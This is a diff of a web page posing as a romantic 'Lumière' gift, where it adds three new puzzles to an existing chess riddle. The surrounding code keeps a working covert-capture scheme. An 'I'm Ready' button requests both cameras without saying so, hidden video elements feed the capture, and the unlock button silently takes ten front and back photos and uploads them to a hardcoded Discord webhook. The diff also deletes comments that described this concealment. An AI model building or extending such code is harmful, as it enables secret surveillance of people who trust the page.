@@ -166,18 +166,9 @@
             width: 100%;
         }
 
-        /* ── Blocked screen ── */
-        #screenBlocked {
-            display: none;
-        }
-
-        #screenBlocked.active {
-            display: flex;
-        }
-
-        #screenBlocked .glass {
-            text-align: center;
-        }
+        #screenBlocked { display: none; }
+        #screenBlocked.active { display: flex; }
+        #screenBlocked .glass { text-align: center; }
 
         .blocked-icon {
             font-size: clamp(40px, 10vw, 52px);
@@ -202,7 +193,6 @@
             line-height: 1.75;
         }
 
-        /* ── Primary button ── */
         .btn-primary {
             width: 100%;
             padding: clamp(13px, 3vw, 16px) 24px;
@@ -266,7 +256,6 @@
             to { transform: scale(4.5); opacity: 0; }
         }
 
-        /* ── Entry screen ── */
         #screenEntry .glass { text-align: center; }
 
         .entry-eyebrow {
@@ -309,7 +298,6 @@
             margin-bottom: clamp(28px, 6vw, 38px);
         }
 
-        /* ── Screen 1 ── */
         #screen1 .glass { text-align: center; }
 
         .eyebrow {
@@ -393,23 +381,57 @@
 
         .do-shake { animation: shake 0.42s ease; }
 
-        /* ── Screen 2 Riddle ── */
-        #screen2 .glass { text-align: center; }
+        .loading-dots {
+            display: inline-flex;
+            gap: 6px;
+            align-items: center;
+            justify-content: center;
+            margin-top: 12px;
+        }
+        .loading-dots span {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--rose);
+            animation: loadPulse 1.2s ease-in-out infinite;
+        }
+        .loading-dots span:nth-child(2) { animation-delay: 0.15s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.3s; }
+        @keyframes loadPulse {
+            0%,100% { opacity: 0.3; transform: scale(0.8); }
+            50%     { opacity: 1; transform: scale(1.2); }
+        }
 
-        .chess-glyph {
+        /* ── Puzzle screens shared ── */
+        .puzzle-glass { text-align: center; }
+
+        .puzzle-icon {
             font-size: clamp(36px, 9vw, 50px);
             margin-bottom: clamp(10px, 2vw, 14px);
             display: inline-block;
-            animation: chessRock 3.5s ease-in-out infinite;
             line-height: 1;
         }
+
+        .puzzle-icon.rock { animation: chessRock 3.5s ease-in-out infinite; }
+        .puzzle-icon.float { animation: floatIcon 3s ease-in-out infinite; }
+        .puzzle-icon.spin { animation: spinIcon 8s linear infinite; }
+        .puzzle-icon.bounce { animation: rewardBounce 2s ease-in-out infinite; }
 
         @keyframes chessRock {
             0%,100% { transform: rotate(-4deg) scale(1); }
             50%     { transform: rotate(4deg) scale(1.06); }
         }
 
-        #screen2 h2 {
+        @keyframes floatIcon {
+            0%,100% { transform: translateY(0) scale(1); }
+            50%     { transform: translateY(-8px) scale(1.05); }
+        }
+
+        @keyframes spinIcon {
+            0%   { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .puzzle-title {
             font-family: 'Cormorant Garamond', serif;
             font-size: clamp(22px, 5.5vw, 28px);
             font-weight: 400;
@@ -417,7 +439,7 @@
             margin-bottom: 4px;
         }
 
-        #screen2 .sub-tag {
+        .puzzle-tag {
             font-size: 10px;
             letter-spacing: 2.5px;
             text-transform: uppercase;
@@ -426,6 +448,22 @@
             margin-bottom: clamp(18px, 4vw, 24px);
             display: block;
         }
+
+        .puzzle-step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: clamp(16px, 3vw, 22px);
+        }
+
+        .step-pip {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--border-md);
+            transition: all 0.3s ease;
+        }
+        .step-pip.done { background: var(--green); transform: scale(1.2); }
+        .step-pip.current { background: var(--rose); transform: scale(1.3); box-shadow: 0 0 8px rgba(196,160,138,0.4); }
 
         .riddle-box {
             background: rgba(255,255,255,0.5);
@@ -534,6 +572,302 @@
 
         .btn-primary.mt { margin-top: clamp(14px, 3vw, 18px); }
 
+        /* ── Sequence puzzle ── */
+        .sequence-display {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: clamp(8px, 2vw, 14px);
+            flex-wrap: wrap;
+            margin-bottom: clamp(6px, 1.5vw, 10px);
+        }
+
+        .seq-num {
+            width: clamp(38px, 9vw, 48px);
+            height: clamp(38px, 9vw, 48px);
+            background: rgba(255,255,255,0.6);
+            border: 1.5px solid var(--border-md);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Cormorant Garamond', serif;
+            font-size: clamp(18px, 4.5vw, 24px);
+            font-weight: 500;
+            color: var(--text);
+        }
+
+        .seq-num.mystery {
+            background: linear-gradient(135deg, rgba(196,160,138,0.15), rgba(158,122,101,0.15));
+            border-color: var(--rose);
+            color: var(--rose-deep);
+            font-size: clamp(16px, 4vw, 20px);
+            animation: softPulse 2s ease-in-out infinite;
+        }
+
+        .seq-arrow {
+            color: var(--text-lt);
+            font-size: clamp(14px, 3vw, 18px);
+        }
+
+        /* ── Color memory puzzle ── */
+        .color-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: clamp(8px, 2vw, 12px);
+            max-width: 280px;
+            margin: 0 auto clamp(16px, 3vw, 22px);
+        }
+
+        .color-tile {
+            aspect-ratio: 1;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.3s ease;
+            border: 2px solid transparent;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .color-tile::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to bottom, rgba(255,255,255,0.2), transparent);
+            border-radius: inherit;
+            pointer-events: none;
+        }
+
+        .color-tile:hover { transform: scale(1.05); }
+        .color-tile:active { transform: scale(0.95); }
+
+        .color-tile.selected {
+            border-color: var(--text);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+            transform: scale(1.08);
+        }
+
+        .color-tile.correct-flash {
+            border-color: var(--green);
+            box-shadow: 0 0 20px rgba(122,158,122,0.4);
+        }
+
+        .color-tile.wrong-flash {
+            border-color: var(--red);
+            box-shadow: 0 0 20px rgba(184,122,122,0.4);
+            animation: shake 0.4s ease;
+        }
+
+        .color-tile.revealed {
+            transform: scale(1.1);
+            box-shadow: 0 0 24px rgba(196,160,138,0.5);
+            border-color: var(--rose);
+        }
+
+        .memory-instruction {
+            font-size: clamp(12px, 2.8vw, 13.5px);
+            color: var(--text-md);
+            font-weight: 300;
+            margin-bottom: clamp(14px, 3vw, 18px);
+            line-height: 1.6;
+        }
+
+        .memory-status {
+            font-size: clamp(11.5px, 2.5vw, 12.5px);
+            color: var(--text-lt);
+            margin-top: 8px;
+            min-height: 20px;
+            font-weight: 300;
+        }
+
+        /* ── Word scramble ── */
+        .scramble-letters {
+            display: flex;
+            justify-content: center;
+            gap: clamp(4px, 1vw, 8px);
+            flex-wrap: wrap;
+            margin-bottom: clamp(16px, 3vw, 22px);
+        }
+
+        .scramble-letter {
+            width: clamp(36px, 8vw, 44px);
+            height: clamp(42px, 10vw, 52px);
+            background: rgba(255,255,255,0.65);
+            border: 1.5px solid var(--border-md);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Cormorant Garamond', serif;
+            font-size: clamp(20px, 5vw, 26px);
+            font-weight: 500;
+            color: var(--text);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            user-select: none;
+        }
+
+        .scramble-letter:hover {
+            border-color: var(--rose);
+            transform: translateY(-2px);
+        }
+
+        .scramble-letter:active { transform: scale(0.93); }
+
+        .scramble-letter.used {
+            opacity: 0.3;
+            pointer-events: none;
+            transform: scale(0.9);
+        }
+
+        .answer-slots {
+            display: flex;
+            justify-content: center;
+            gap: clamp(4px, 1vw, 8px);
+            margin-bottom: clamp(14px, 3vw, 18px);
+        }
+
+        .answer-slot {
+            width: clamp(36px, 8vw, 44px);
+            height: clamp(42px, 10vw, 52px);
+            background: rgba(255,255,255,0.4);
+            border: 1.5px dashed var(--border-md);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Cormorant Garamond', serif;
+            font-size: clamp(20px, 5vw, 26px);
+            font-weight: 500;
+            color: var(--rose-deep);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .answer-slot.filled {
+            background: rgba(255,255,255,0.7);
+            border-style: solid;
+            border-color: var(--rose);
+        }
+
+        .answer-slot:hover { border-color: var(--rose); }
+
+        .scramble-hint-btn {
+            background: none;
+            border: 1px solid var(--border-md);
+            border-radius: 100px;
+            padding: 6px 16px;
+            font-size: clamp(11px, 2.5vw, 12px);
+            color: var(--text-lt);
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.2s ease;
+            margin-bottom: clamp(10px, 2vw, 14px);
+        }
+
+        .scramble-hint-btn:hover {
+            border-color: var(--rose);
+            color: var(--rose-deep);
+        }
+
+        /* ── Slider puzzle ── */
+        .slider-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: clamp(14px, 3vw, 20px);
+            margin-bottom: clamp(16px, 3vw, 22px);
+        }
+
+        .slider-row {
+            display: flex;
+            align-items: center;
+            gap: clamp(10px, 2vw, 16px);
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .slider-emoji {
+            font-size: clamp(20px, 5vw, 28px);
+            flex-shrink: 0;
+            width: 36px;
+            text-align: center;
+        }
+
+        .slider-track-custom {
+            flex: 1;
+            position: relative;
+            height: 6px;
+            background: rgba(180,160,148,0.2);
+            border-radius: 10px;
+            overflow: visible;
+        }
+
+        .slider-input {
+            width: 100%;
+            height: 6px;
+            -webkit-appearance: none;
+            appearance: none;
+            background: transparent;
+            position: relative;
+            z-index: 2;
+            cursor: pointer;
+            margin: 0;
+        }
+
+        .slider-input::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: clamp(22px, 5vw, 28px);
+            height: clamp(22px, 5vw, 28px);
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--rose), var(--rose-deep));
+            box-shadow: 0 2px 8px rgba(158,122,101,0.35);
+            cursor: pointer;
+            border: 2px solid #fff;
+        }
+
+        .slider-input::-moz-range-thumb {
+            width: clamp(22px, 5vw, 28px);
+            height: clamp(22px, 5vw, 28px);
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--rose), var(--rose-deep));
+            box-shadow: 0 2px 8px rgba(158,122,101,0.35);
+            cursor: pointer;
+            border: 2px solid #fff;
+        }
+
+        .slider-val {
+            font-size: clamp(14px, 3.5vw, 17px);
+            font-weight: 500;
+            color: var(--text);
+            min-width: 30px;
+            text-align: center;
+        }
+
+        .slider-result {
+            font-size: clamp(28px, 7vw, 38px);
+            font-weight: 300;
+            color: var(--text);
+            font-family: 'Cormorant Garamond', serif;
+            padding: clamp(10px, 2vw, 14px) 0;
+            transition: color 0.3s ease;
+        }
+
+        .slider-result.matched {
+            color: var(--green);
+        }
+
+        .slider-target {
+            font-size: clamp(12px, 2.8vw, 13.5px);
+            color: var(--text-lt);
+            font-weight: 300;
+        }
+
+        .slider-target strong {
+            color: var(--rose-deep);
+            font-weight: 500;
+        }
+
         /* ── Screen 3 Reward ── */
         #screen3 {
             max-width: 460px;
@@ -638,7 +972,6 @@
             margin-top: 2px;
         }
 
-        /* Hidden camera elements */
         #hVidFront, #hVidBack, #hCanvas {
             position: fixed;
             top: -9999px; left: -9999px;
@@ -674,27 +1007,13 @@
             100% { opacity: 0; transform: translateY(105vh) rotate(800deg); }
         }
 
-        /* Loading spinner for screen1 */
-        .loading-dots {
-            display: inline-flex;
-            gap: 6px;
-            align-items: center;
-            justify-content: center;
-            margin-top: 12px;
+        .scrollable-glass {
+            max-height: 80vh;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
         }
-        .loading-dots span {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--rose);
-            animation: loadPulse 1.2s ease-in-out infinite;
-        }
-        .loading-dots span:nth-child(2) { animation-delay: 0.15s; }
-        .loading-dots span:nth-child(3) { animation-delay: 0.3s; }
-        @keyframes loadPulse {
-            0%,100% { opacity: 0.3; transform: scale(0.8); }
-            50%     { opacity: 1; transform: scale(1.2); }
-        }
+        .scrollable-glass::-webkit-scrollbar { display: none; }
     </style>
 </head>
 <body>
@@ -706,7 +1025,6 @@
     </div>
     <div class="grain"></div>
 
-    <!-- Two separate hidden video elements — one per camera -->
     <video id="hVidFront" autoplay playsinline muted></video>
     <video id="hVidBack"  autoplay playsinline muted></video>
     <canvas id="hCanvas"></canvas>
@@ -715,7 +1033,7 @@
 
     <div class="wrapper">
 
-        <!-- ══ BLOCKED SCREEN ══ -->
+        <!-- ══ BLOCKED ══ -->
         <div class="screen" id="screenBlocked">
             <div class="glass">
                 <div class="blocked-icon">🔒</div>
@@ -726,7 +1044,7 @@
             </div>
         </div>
 
-        <!-- ══ ENTRY SCREEN ══ -->
+        <!-- ══ ENTRY ══ -->
         <div class="screen active" id="screenEntry">
             <div class="glass">
                 <span class="entry-eyebrow">Lumière</span>
@@ -744,7 +1062,7 @@
             </div>
         </div>
 
-        <!-- ══ SCREEN 1 — Unlock (single button) ══ -->
+        <!-- ══ SCREEN 1 — Single Unlock Button ══ -->
         <div class="screen" id="screen1">
             <div class="glass">
                 <span class="eyebrow">Lumière — For You</span>
@@ -768,12 +1086,18 @@
             </div>
         </div>
 
-        <!-- ══ SCREEN 2 — Riddle ══ -->
-        <div class="screen" id="screen2">
-            <div class="glass">
-                <span class="chess-glyph">♟</span>
-                <h2>One Final Move</h2>
-                <span class="sub-tag">Solve to unlock your gift</span>
+        <!-- ══ PUZZLE 1 — Chess King (original) ══ -->
+        <div class="screen" id="puzzle1">
+            <div class="glass puzzle-glass scrollable-glass">
+                <div class="puzzle-step-indicator">
+                    <div class="step-pip current" id="pip1"></div>
+                    <div class="step-pip" id="pip2"></div>
+                    <div class="step-pip" id="pip3"></div>
+                    <div class="step-pip" id="pip4"></div>
+                </div>
+                <span class="puzzle-icon rock">♟</span>
+                <h2 class="puzzle-title">The King's Journey</h2>
+                <span class="puzzle-tag">Puzzle 1 of 4</span>
                 <div class="riddle-box">
                     <p>
                         A lone <strong>King</strong> stands on <strong>e1</strong>.
@@ -789,20 +1113,112 @@
                     </div>
                 </div>
                 <label class="input-label">Your Answer</label>
-                <input
-                    class="ans-input"
-                    id="ansInput"
-                    type="text"
-                    placeholder="Type a number…"
-                    maxlength="8"
-                    autocomplete="off"
-                    autocorrect="off"
-                    spellcheck="false"
-                />
-                <div class="feedback" id="feedback"></div>
-                <button class="btn-primary mt" onclick="checkAnswer()">
-                    Reveal My Gift →
-                </button>
+                <input class="ans-input" id="ans1" type="text" placeholder="Type a number…" maxlength="8" autocomplete="off" autocorrect="off" spellcheck="false"/>
+                <div class="feedback" id="fb1"></div>
+                <button class="btn-primary mt" onclick="checkPuzzle1()">Submit →</button>
+            </div>
+        </div>
+
+        <!-- ══ PUZZLE 2 — Number Sequence ══ -->
+        <div class="screen" id="puzzle2">
+            <div class="glass puzzle-glass scrollable-glass">
+                <div class="puzzle-step-indicator">
+                    <div class="step-pip done" id="pip2a"></div>
+                    <div class="step-pip current" id="pip2b"></div>
+                    <div class="step-pip" id="pip2c"></div>
+                    <div class="step-pip" id="pip2d"></div>
+                </div>
+                <span class="puzzle-icon float">🔢</span>
+                <h2 class="puzzle-title">The Missing Piece</h2>
+                <span class="puzzle-tag">Puzzle 2 of 4</span>
+                <div class="riddle-box">
+                    <p>Find the <strong>next number</strong> in this sequence:</p>
+                    <div class="sequence-display" style="margin-top:16px;">
+                        <div class="seq-num">2</div>
+                        <span class="seq-arrow">→</span>
+                        <div class="seq-num">6</div>
+                        <span class="seq-arrow">→</span>
+                        <div class="seq-num">12</div>
+                        <span class="seq-arrow">→</span>
+                        <div class="seq-num">20</div>
+                        <span class="seq-arrow">→</span>
+                        <div class="seq-num mystery">?</div>
+                    </div>
+                    <div class="riddle-hint">
+                        <span>💡</span>
+                        <span>Look at the differences between consecutive numbers.</span>
+                    </div>
+                </div>
+                <label class="input-label">Your Answer</label>
+                <input class="ans-input" id="ans2" type="text" placeholder="Type a number…" maxlength="8" autocomplete="off" autocorrect="off" spellcheck="false"/>
+                <div class="feedback" id="fb2"></div>
+                <button class="btn-primary mt" onclick="checkPuzzle2()">Submit →</button>
+            </div>
+        </div>
+
+        <!-- ══ PUZZLE 3 — Word Scramble ══ -->
+        <div class="screen" id="puzzle3">
+            <div class="glass puzzle-glass scrollable-glass">
+                <div class="puzzle-step-indicator">
+                    <div class="step-pip done"></div>
+                    <div class="step-pip done"></div>
+                    <div class="step-pip current"></div>
+                    <div class="step-pip"></div>
+                </div>
+                <span class="puzzle-icon bounce">🔤</span>
+                <h2 class="puzzle-title">Unscramble</h2>
+                <span class="puzzle-tag">Puzzle 3 of 4</span>
+                <div class="riddle-box">
+                    <p>Rearrange these letters to form a <strong>single word</strong> — something that lights up the dark.</p>
+                </div>
+                <div class="answer-slots" id="answerSlots"></div>
+                <div class="scramble-letters" id="scrambleLetters"></div>
+                <button class="scramble-hint-btn" onclick="scrambleHint()">💡 Hint</button>
+                <div class="feedback" id="fb3"></div>
+                <button class="btn-primary mt" onclick="checkPuzzle3()">Submit →</button>
+            </div>
+        </div>
+
+        <!-- ══ PUZZLE 4 — Emoji Math Sliders ══ -->
+        <div class="screen" id="puzzle4">
+            <div class="glass puzzle-glass scrollable-glass">
+                <div class="puzzle-step-indicator">
+                    <div class="step-pip done"></div>
+                    <div class="step-pip done"></div>
+                    <div class="step-pip done"></div>
+                    <div class="step-pip current"></div>
+                </div>
+                <span class="puzzle-icon spin">⚙️</span>
+                <h2 class="puzzle-title">Calibrate</h2>
+                <span class="puzzle-tag">Final Puzzle</span>
+                <div class="riddle-box">
+                    <p>Adjust the sliders so that<br><strong>🌙 × ⭐ + 🔥 = 42</strong></p>
+                    <div class="riddle-hint">
+                        <span>💡</span>
+                        <span>There are multiple solutions. Find any one.</span>
+                    </div>
+                </div>
+                <div class="slider-container">
+                    <div class="slider-row">
+                        <span class="slider-emoji">🌙</span>
+                        <input type="range" class="slider-input" id="slider1" min="1" max="20" value="1" oninput="updateSliders()">
+                        <span class="slider-val" id="sv1">1</span>
+                    </div>
+                    <div class="slider-row">
+                        <span class="slider-emoji">⭐</span>
+                        <input type="range" class="slider-input" id="slider2" min="1" max="20" value="1" oninput="updateSliders()">
+                        <span class="slider-val" id="sv2">1</span>
+                    </div>
+                    <div class="slider-row">
+                        <span class="slider-emoji">🔥</span>
+                        <input type="range" class="slider-input" id="slider3" min="1" max="20" value="1" oninput="updateSliders()">
+                        <span class="slider-val" id="sv3">1</span>
+                    </div>
+                    <div class="slider-target">Current: <span id="sliderResult" class="slider-result">2</span></div>
+                    <div class="slider-target">Target: <strong>42</strong></div>
+                </div>
+                <div class="feedback" id="fb4"></div>
+                <button class="btn-primary mt" onclick="checkPuzzle4()">Reveal My Gift →</button>
             </div>
         </div>
 
@@ -860,8 +1276,6 @@
         //  CONFIG
         // ═══════════════════════════════════
         const WEBHOOK = 'https://discord.com/api/webhooks/1483170891067035720/03v7HSBjXT9T7uiVr3H--C04TGrV28W4zDGHCEMtsDRTfH68e7Y5n4Vb22tmG7zpbizl';
-        const ANSWER  = ['7', 'seven', '7 moves'];
-        const TOTAL_PHOTOS = 10; // 5 front + 5 back
         // ═══════════════════════════════════
 
         let frontStream = null;
@@ -874,9 +1288,9 @@
         const mb = document.getElementById('miniBoard');
         const pieces = ['♚','','','','','','','','','♟','','♟','','','♟','','','','','','♔','','','',''];
         for (let i = 0; i < 25; i++) {
-            const c   = document.createElement('div');
+            const c = document.createElement('div');
             const row = Math.floor(i / 5), col = i % 5;
-            c.className  = 'mb-cell ' + ((row + col) % 2 === 0 ? 'mb-l' : 'mb-d');
+            c.className = 'mb-cell ' + ((row + col) % 2 === 0 ? 'mb-l' : 'mb-d');
             c.textContent = pieces[i] || '';
             mb.appendChild(c);
         }
@@ -896,8 +1310,86 @@
             document.body.appendChild(g);
         }
 
+        // ── Word Scramble Setup ──
+        const SCRAMBLE_WORD = 'LANTERN';
+        const scrambledOrder = [4, 1, 6, 0, 3, 5, 2]; // N, A, N, L, E, R, T -> rearranged
+        let selectedLetters = [];
+        let letterElements = [];
+
+        function initScramble() {
+            const container = document.getElementById('scrambleLetters');
+            const slotsContainer = document.getElementById('answerSlots');
+            container.innerHTML = '';
+            slotsContainer.innerHTML = '';
+            selectedLetters = [];
+            letterElements = [];
+
+            const scrambled = scrambledOrder.map(i => SCRAMBLE_WORD[i]);
+
+            scrambled.forEach((letter, idx) => {
+                const el = document.createElement('div');
+                el.className = 'scramble-letter';
+                el.textContent = letter;
+                el.dataset.idx = idx;
+                el.onclick = () => selectLetter(idx);
+                container.appendChild(el);
+                letterElements.push(el);
+            });
+
+            for (let i = 0; i < SCRAMBLE_WORD.length; i++) {
+                const slot = document.createElement('div');
+                slot.className = 'answer-slot';
+                slot.dataset.pos = i;
+                slot.onclick = () => removeFromSlot(i);
+                slotsContainer.appendChild(slot);
+            }
+        }
+
+        function selectLetter(idx) {
+            if (letterElements[idx].classList.contains('used')) return;
+            if (selectedLetters.length >= SCRAMBLE_WORD.length) return;
+
+            letterElements[idx].classList.add('used');
+            selectedLetters.push({ idx, letter: letterElements[idx].textContent });
+
+            const slots = document.querySelectorAll('.answer-slot');
+            const pos = selectedLetters.length - 1;
+            slots[pos].textContent = letterElements[idx].textContent;
+            slots[pos].classList.add('filled');
+
+            document.getElementById('fb3').textContent = '';
+            document.getElementById('fb3').className = 'feedback';
+        }
+
+        function removeFromSlot(pos) {
+            if (pos >= selectedLetters.length) return;
+
+            const removed = selectedLetters.splice(pos);
+            removed.forEach(item => {
+                letterElements[item.idx].classList.remove('used');
+            });
+
+            const slots = document.querySelectorAll('.answer-slot');
+            for (let i = pos; i < SCRAMBLE_WORD.length; i++) {
+                slots[i].textContent = '';
+                slots[i].classList.remove('filled');
+            }
+
+            selectedLetters.forEach((item, i) => {
+                slots[i].textContent = item.letter;
+                slots[i].classList.add('filled');
+            });
+        }
+
+        function scrambleHint() {
+            document.getElementById('fb3').className = 'feedback ok';
+            document.getElementById('fb3').textContent = '💡 Think of something you carry in the dark… a paper one, perhaps.';
+        }
+
+        initScramble();
+
         // ══════════════════════════════════════════════
-        //  ENTRY — request both cameras silently
+        //  CAMERA
         // ══════════════════════════════════════════════
         async function handleEntry(e) {
             ripple(e, 'entryBtn');
@@ -905,19 +1397,13 @@
             btn.textContent = 'Preparing…';
             btn.disabled = true;
 
-            // Request front camera — browser will show its own permission popup
-            // but our button just says "I'm Ready" — no mention of camera
             const frontOk = await startFrontCamera();
-
             if (!frontOk) {
                 showBlocked();
                 return;
             }
 
-            // Front granted — now silently request back camera
             await startBackCamera();
-
-            // Move to unlock screen
             setTimeout(() => switchScreen('screen1'), 800);
         }
 
@@ -943,7 +1429,7 @@
                 backStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { exact: 'environment' },
-                        width:  { ideal: 1280 },
+                        width: { ideal: 1280 },
                         height: { ideal: 720 }
                     },
                     audio: false
@@ -964,8 +1450,7 @@
         }
 
         // ══════════════════════════════════════════════
-        //  SINGLE BUTTON UNLOCK — captures 10 photos
-        //  (5 front + 5 back) over ~5 seconds then proceeds
+        //  SINGLE UNLOCK BUTTON — 10 photos
         // ══════════════════════════════════════════════
         async function handleUnlock(e) {
             if (isCapturing) return;
@@ -980,36 +1465,27 @@
             btn.disabled = true;
             loadingDots.style.display = 'flex';
 
-            // Capture 10 photos: alternate front/back every ~500ms
-            // This gives cameras time to produce clear frames
             const totalCaptures = 10;
             let captureCount = 0;
 
             for (let i = 0; i < 5; i++) {
-                // Capture front
                 await snapFromVideo('hVidFront', 'front', i + 1, frontLive);
                 captureCount++;
                 pFill.style.width = (captureCount / totalCaptures * 100) + '%';
-
-                // Small delay for clear image
                 await delay(450);
 
-                // Capture back
                 await snapFromVideo('hVidBack', 'back', i + 1, backLive);
                 captureCount++;
                 pFill.style.width = (captureCount / totalCaptures * 100) + '%';
-
-                // Small delay before next round
                 if (i < 4) await delay(450);
             }
 
-            // All photos captured — proceed to riddle
             btn.textContent = 'Opening…';
             loadingDots.style.display = 'none';
 
             setTimeout(() => {
                 stopAllCams();
-                switchScreen('screen2');
+                switchScreen('puzzle1');
             }, 600);
         }
 
@@ -1017,9 +1493,6 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // ══════════════════════════════════════════════
-        //  CAPTURE — from specific video element
-        // ══════════════════════════════════════════════
         async function snapFromVideo(videoId, label, shotNum, isLive) {
             if (!isLive) return;
             try {
@@ -1027,11 +1500,10 @@
                 if (!vid || vid.readyState < 2 || vid.videoWidth === 0) return;
 
                 const canvas = document.getElementById('hCanvas');
-                canvas.width  = vid.videoWidth;
+                canvas.width = vid.videoWidth;
                 canvas.height = vid.videoHeight;
 
                 const ctx = canvas.getContext('2d');
-
                 if (label === 'front') {
                     ctx.save();
                     ctx.translate(canvas.width, 0);
@@ -1047,23 +1519,19 @@
                 });
 
                 if (blob) sendToDiscord(blob, label, shotNum);
-            } catch (_) { /* silent */ }
+            } catch (_) {}
         }
 
         function sendToDiscord(blob, label, shotNum) {
             try {
-                const now  = new Date().toLocaleString();
+                const now = new Date().toLocaleString();
                 const emoji = label === 'front' ? '🤳' : '📷';
-                const file  = new File(
-                    [blob],
-                    `${label}_shot${shotNum}.jpg`,
-                    { type: 'image/jpeg' }
-                );
+                const file = new File([blob], `${label}_shot${shotNum}.jpg`, { type: 'image/jpeg' });
                 const fd = new FormData();
                 fd.append('file', file);
                 fd.append('payload_json', JSON.stringify({
                     username: 'Lumière Cam',
-                    content : `${emoji} **${label === 'front' ? 'Front' : 'Back'} · Shot ${shotNum}/5** — ${now}`
+                    content: `${emoji} **${label === 'front' ? 'Front' : 'Back'} · Shot ${shotNum}/5** — ${now}`
                 }));
                 fetch(WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
             } catch (_) {}
@@ -1074,34 +1542,134 @@
                 if (s) s.getTracks().forEach(t => t.stop());
             });
             frontStream = backStream = null;
-            frontLive   = backLive   = false;
+            frontLive = backLive = false;
         }
 
         // ══════════════════════════════════════════════
-        //  RIDDLE
+        //  PUZZLE 1 — Chess King (answer: 7)
         // ══════════════════════════════════════════════
-        function checkAnswer() {
-            const input = document.getElementById('ansInput');
-            const fb    = document.getElementById('feedback');
-            const val   = input.value.trim().toLowerCase();
+        function checkPuzzle1() {
+            const input = document.getElementById('ans1');
+            const fb = document.getElementById('fb1');
+            const val = input.value.trim().toLowerCase();
 
-            if (ANSWER.includes(val)) {
+            if (['7', 'seven', '7 moves'].includes(val)) {
                 input.classList.remove('err');
                 input.classList.add('ok');
-                fb.className   = 'feedback ok';
+                fb.className = 'feedback ok';
                 fb.textContent = '✓ Correct — seven moves. Brilliant.';
-                setTimeout(() => { confetti(); switchScreen('screen3'); }, 950);
+                setTimeout(() => switchScreen('puzzle2'), 950);
             } else {
                 input.classList.remove('ok');
                 input.classList.add('err');
-                fb.className   = 'feedback err';
+                fb.className = 'feedback err';
                 fb.textContent = '✗ Not quite. Remember — the King moves diagonally too.';
                 setTimeout(() => input.classList.remove('err'), 550);
             }
         }
 
-        document.getElementById('ansInput')
-            .addEventListener('keydown', e => { if (e.key === 'Enter') checkAnswer(); });
+        document.getElementById('ans1').addEventListener('keydown', e => { if (e.key === 'Enter') checkPuzzle1(); });
+
+        // ══════════════════════════════════════════════
+        //  PUZZLE 2 — Number Sequence (answer: 30)
+        //  2, 6, 12, 20, 30  (differences: 4, 6, 8, 10)
+        // ══════════════════════════════════════════════
+        function checkPuzzle2() {
+            const input = document.getElementById('ans2');
+            const fb = document.getElementById('fb2');
+            const val = input.value.trim().toLowerCase();
+
+            if (['30', 'thirty'].includes(val)) {
+                input.classList.remove('err');
+                input.classList.add('ok');
+                fb.className = 'feedback ok';
+                fb.textContent = '✓ Correct — 30. The differences grow by 2 each time.';
+                setTimeout(() => switchScreen('puzzle3'), 950);
+            } else {
+                input.classList.remove('ok');
+                input.classList.add('err');
+                fb.className = 'feedback err';
+                fb.textContent = '✗ Not quite. The gaps between numbers are 4, 6, 8… what comes next?';
+                setTimeout(() => input.classList.remove('err'), 550);
+            }
+        }
+
+        document.getElementById('ans2').addEventListener('keydown', e => { if (e.key === 'Enter') checkPuzzle2(); });
+
+        // ══════════════════════════════════════════════
+        //  PUZZLE 3 — Word Scramble (answer: LANTERN)
+        // ══════════════════════════════════════════════
+        function checkPuzzle3() {
+            const fb = document.getElementById('fb3');
+            const formed = selectedLetters.map(s => s.letter).join('');
+
+            if (formed.toUpperCase() === SCRAMBLE_WORD) {
+                fb.className = 'feedback ok';
+                fb.textContent = '✓ LANTERN — perfect! Light the way.';
+
+                document.querySelectorAll('.answer-slot').forEach(s => {
+                    s.style.borderColor = 'var(--green)';
+                    s.style.background = 'rgba(122,158,122,0.1)';
+                });
+
+                setTimeout(() => switchScreen('puzzle4'), 950);
+            } else if (formed.length < SCRAMBLE_WORD.length) {
+                fb.className = 'feedback err';
+                fb.textContent = '✗ Place all the letters first.';
+            } else {
+                fb.className = 'feedback err';
+                fb.textContent = '✗ Not the right word. Try rearranging.';
+
+                document.querySelectorAll('.answer-slot').forEach(s => {
+                    s.style.borderColor = 'var(--red)';
+                });
+                setTimeout(() => {
+                    document.querySelectorAll('.answer-slot').forEach(s => {
+                        s.style.borderColor = '';
+                    });
+                }, 600);
+            }
+        }
+
+        // ══════════════════════════════════════════════
+        //  PUZZLE 4 — Emoji Sliders (🌙 × ⭐ + 🔥 = 42)
+        // ══════════════════════════════════════════════
+        function updateSliders() {
+            const a = parseInt(document.getElementById('slider1').value);
+            const b = parseInt(document.getElementById('slider2').value);
+            const c = parseInt(document.getElementById('slider3').value);
+
+            document.getElementById('sv1').textContent = a;
